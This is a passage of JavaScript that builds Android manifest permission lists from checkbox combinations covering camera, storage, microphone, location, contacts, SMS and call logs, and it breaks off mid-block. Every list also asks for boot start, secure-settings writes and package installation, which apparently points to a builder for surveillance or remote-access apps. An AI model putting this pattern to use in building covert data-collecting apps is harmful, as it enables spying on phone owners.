          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
        // if 5 checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
